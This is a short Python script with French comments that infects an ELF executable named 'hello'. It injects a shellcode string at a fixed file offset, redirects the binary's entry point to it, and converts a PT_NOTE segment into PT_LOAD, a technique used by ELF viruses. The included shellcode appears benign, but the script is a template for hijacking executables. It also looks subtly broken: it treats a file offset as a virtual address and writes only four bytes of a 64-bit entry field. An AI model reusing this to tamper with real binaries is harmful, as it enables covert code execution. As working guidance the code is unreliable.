import struct

# Étape 1 : Préparer le shellcode (payload)
shellcode = b"\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\x52\x48\x89\xe6\x48\x31\xc0\xb0\x01\x0f\x05"

# Étape 2 : Offsets et tailles
offset_shellcode = 0x368  # Offset dans le fichier où injecter le shellcode
offset_entry_point = 0x18  # Offset de l'entry point dans l'en-tête ELF
entry_point_shellcode = 0x368  # Adresse virtuelle du shellcode

# Étape 3 : Modifier le fichier ELF
with open("hello", "r+b") as f:
    # Insérer le shellcode
    f.seek(offset_shellcode)
    f.write(shellcode)
    
    # Modifier l'entry point pour pointer vers le shellcode
    f.seek(offset_entry_point)
    f.write(struct.pack("<I", entry_point_shellcode))  # "<I" pour écrire en little-endian

    # Transformer le segment PT_NOTE en PT_LOAD (si nécessaire)
    offset_pt_note = 0x120  # Offset où se trouve l'en-tête PT_NOTE
    f.seek(offset_pt_note)
    f.write(b"\x01\x00\x00\x00")  # Changer le type en PT_LOAD